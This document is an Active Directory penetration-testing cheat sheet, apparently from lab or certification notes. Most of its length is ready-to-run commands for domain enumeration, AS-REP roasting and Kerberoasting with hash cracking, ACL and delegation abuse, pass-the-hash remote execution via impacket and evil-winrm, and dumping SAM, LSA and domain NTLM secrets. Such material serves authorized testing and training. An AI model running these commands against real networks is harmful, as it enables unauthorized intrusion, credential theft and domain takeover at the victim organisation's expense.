## Active Directory

Start with identity, DNS, and time. Many apparent Kerberos failures are actually
name-resolution or clock problems.

### Establish context

#### From Windows

```powershell
whoami /all
hostname
systeminfo | findstr /B /C:"Domain"
ipconfig /all
nltest /dsgetdc:<domain>
set LOGONSERVER
net user /domain
net group /domain
net group 'Domain Admins' /domain
setspn -T <domain> -Q */*
```

#### From Kali

```bash
dig @"$IP" _ldap._tcp.dc._msdcs."$DOMAIN" SRV
nmap -Pn -p53,88,135,139,389,445,464,636,3268,5985 "$IP"
netexec smb "$IP" -u '' -p ''
sudo ntpdate -u "$IP"
nslookup -type=SRV _kerberos._tcp."$DOMAIN" "$IP"
kerbrute userenum -d "$DOMAIN" --dc "$IP" users.txt
```

Add the domain controller's hostname and domain to `/etc/hosts` only after they
are confirmed.

### Enumerate with valid credentials

```bash
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --users
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --groups
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --shares
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --pass-pol
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --computers
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --loggedon-users
smbclient "//$IP/SYSVOL" -U "$DOMAIN/$USER%$PASS"
```

```powershell
Get-ADDomain
Get-ADUser -Filter * -Properties ServicePrincipalName |
  Select-Object SamAccountName,ServicePrincipalName
Get-ADGroupMember 'Domain Admins'
Get-ADComputer -Filter *
Get-ADTrust -Filter *
Get-ADUser -Identity "$env:USERNAME" -Properties MemberOf,Description,LastLogonDate
```

If the ActiveDirectory module is unavailable, use built-in commands, LDAP,
PowerView, or compatible tooling. Record which source produced each fact.

### LDAP

```bash
ldapsearch -x -H "ldap://$IP" -D "$USER@$DOMAIN" -w "$PASS" \
  -b 'DC=example,DC=local' '(objectClass=user)' sAMAccountName memberOf userAccountControl
ldapsearch -x -H "ldap://$IP" -D "$USER@$DOMAIN" -w "$PASS" \
  -b 'DC=example,DC=local' '(&(objectCategory=person)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName memberOf
ldapsearch -x -H "ldap://$IP" -D "$USER@$DOMAIN" -w "$PASS" \
  -b 'DC=example,DC=local' '(description=*)' sAMAccountName description
```

Useful attributes include group membership, descriptions, SPNs, delegation
settings, logon scripts, and ACL-related object identifiers.

### BloodHound collection

```bash
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$IP" -c All --zip
netexec ldap "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --bloodhound --collection All
```

On Windows:

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp
```

Use the graph to form a hypothesis, then verify the relevant group membership,
session, ACL, or delegation property manually.

### AS-REP roasting

With a user list:

```bash
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$IP" -usersfile users.txt -no-pass -request
```

With credentials:

```bash
impacket-GetNPUsers "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request
```

From Windows:

```powershell
.\Rubeus.exe asreproast /nowrap /outfile:asrep.hash
```

Crack etype 23 material:

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

```bash
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$IP" -request -outputfile tgs.hash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```

```powershell
.\Rubeus.exe kerberoast /nowrap /outfile:tgs.hash
setspn -Q */*
```

Prioritize service accounts using evidence such as password age, privileges,
group membership, and the systems they control.

### ACLs and group control

PowerView examples:

```powershell
Get-DomainObjectAcl -Identity <object> -ResolveGUIDs
Get-DomainGroupMember -Identity <group> -Recurse
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainUser -Identity "$env:USERNAME" | Select-Object objectsid
Get-DomainObjectAcl -SearchBase 'DC=example,DC=local' -ResolveGUIDs |
  Where-Object SecurityIdentifier -eq '<controlled-user-sid>'
```

Common impactful rights include `GenericAll`, `GenericWrite`, `WriteDacl`,
`WriteOwner`, `ForceChangePassword`, and control over a group containing a more
privileged user. Verify inheritance and the exact target object before acting.

### Delegation

```powershell
Get-DomainComputer -TrustedToAuth
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-ADComputer -Filter * -Properties TrustedForDelegation,TrustedToAuthForDelegation,
  msDS-AllowedToDelegateTo,msDS-AllowedToActOnBehalfOfOtherIdentity
```

For resource-based constrained delegation and other delegation paths, identify
the controlled principal, target SPN, writable attribute, and required ticket
flow. Do not treat a BloodHound edge as a complete procedure.

### Credential reuse and remote access

```bash
netexec smb targets.txt -d "$DOMAIN" -u "$USER" -p "$PASS"
evil-winrm -i "$IP" -u "$USER" -p "$PASS"
impacket-wmiexec "$DOMAIN/$USER:$PASS@$IP"
impacket-psexec "$DOMAIN/$USER:$PASS@$IP"
impacket-smbexec "$DOMAIN/$USER:$PASS@$IP"
impacket-atexec "$DOMAIN/$USER:$PASS@$IP" whoami
impacket-dcomexec "$DOMAIN/$USER:$PASS@$IP"
```

Pass an NTLM hash only where NTLM authentication is accepted:

```bash
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -H '<NTLM>'
impacket-wmiexec -hashes ':<NTLM>' "$DOMAIN/$USER@$IP"
evil-winrm -i "$IP" -u "$USER" -H '<NTLM>'
```

Remote execution methods have different privilege, service, and share
requirements. Authentication success does not mean a method can execute.

### Secrets and domain data

With appropriate local administrative rights:

```bash
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --sam
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --lsa
impacket-secretsdump "$DOMAIN/$USER:$PASS@$IP"
```

With directory replication rights:

```bash
impacket-secretsdump "$DOMAIN/$USER:$PASS@$IP" -just-dc-ntlm
```

Search Group Policy preferences and SYSVOL content:

```bash
netexec smb "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" -M gpp_password
smbclient "//$IP/SYSVOL" -U "$DOMAIN/$USER%$PASS" -c 'recurse;prompt OFF;mget *'
rg -n -i 'cpassword|password|username|script' SYSVOL/
```

## Tickets from Kali

```bash
impacket-getTGT "$DOMAIN/$USER:$PASS" -dc-ip "$IP"
export KRB5CCNAME="$PWD/$USER.ccache"
klist
netexec smb '<dc-hostname>' -d "$DOMAIN" -u "$USER" -k --use-kcache
```

Use fully qualified hostnames that match service principal names and ensure
`/etc/krb5.conf`, DNS, and time are correct.

Differentiate local SAM material, LSA secrets, cached domain credentials, and
directory replication output; they have different scope and reuse paths.

### Kerberos troubleshooting

```bash
date
dig "$DOMAIN"
klist
KRB5_TRACE=/dev/stderr kinit "$USER@$DOMAIN"
kvno "cifs/<hostname>.$DOMAIN"
kdestroy
```

- Use hostnames rather than IP addresses when Kerberos requires an SPN.
- Ensure DNS resolves the domain controller correctly.
- Synchronize time before debugging tickets.
- Match realm capitalization and domain syntax.
- Clear stale tickets when changing identities.

### When stuck

- Re-run share and LDAP enumeration with every validated identity.
- Inspect user descriptions, logon scripts, SYSVOL, and application shares.
- Map local administrator access across hosts.
- Correlate sessions with systems controlled by the current user.
- Verify BloodHound edges manually.
- Reassess DNS, time, and SPNs before abandoning a Kerberos path.
